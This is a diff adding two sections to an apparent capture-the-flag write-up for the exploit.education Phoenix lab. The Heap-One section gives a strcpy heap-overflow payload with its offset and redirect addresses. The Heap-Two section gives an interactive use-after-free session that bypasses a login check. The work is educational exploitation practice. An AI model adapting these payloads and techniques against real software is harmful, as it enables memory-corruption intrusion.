@@ -401,3 +401,59 @@ from pwn import *
 	Congratulations, you have passed this level
 
 	```
+
+
+## Heap-One
+
+- Vulnerability:
+  1- strcpy takes the input as the pointer without bound checking.
+  2- the malloc functionality could be exploited using it.
+  
+- Procedure of Exploitation:
+  1- The functiona takes two arguments.
+  2- We have to overwrite the first argument using the buffer overflow and point to the puts function
+  3- Then we will redirect the second argument to run the winer function.
+  4- The offset required to exploit the vulnerability is 20 for first argument.
+  
+  
+  ```sh
+  
+  user@phoenix-amd64:~$ /opt/phoenix/i486/heap-one  $(python -c "print 'A'*20 + '\x40\xc1\x04\x08'") $(python -c "print '\x9a\x88\x04\x08'")
+  Congratulations, you've completed this level @ 1750751291 seconds past the Epoch
+
+  
+  ```
+
+
+## Heap-Two
+
+- Vulnerability:
+  - after freeing the malloc it is again called.
+  
+Exploitation:
+	- We have to print the **You are already Logged In!**.
+	- We have to flow the pattern defined in code:
+	
+	
+	```sh
+	
+	user@phoenix-amd64:~$ /opt/phoenix/i486/heap-two 
+	Welcome to phoenix/heap-two, brought to you by https://exploit.education
+	[ auth = 0, service = 0 ]
+	auth AAAA
+	[ auth = 0x8049af0, service = 0 ]
+	reset
+	[ auth = 0x8049af0, service = 0 ]
+	serviceAAAAAAAAAAAAABB
+	[ auth = 0x8049af0, service = 0x8049af0 ]
+	login
+	you have logged in already!
+	[ auth = 0x8049af0, service = 0x8049af0 ]
+
+
+	```
+	
+	- After everthing is reset the malloc is freed
+	- and the freed memory is allocated to the **service**.
+	- at last when the user logged it will be checking the previous memory.
+	- if we have provided with the same characters as login it will give **You are already Logged In!**.
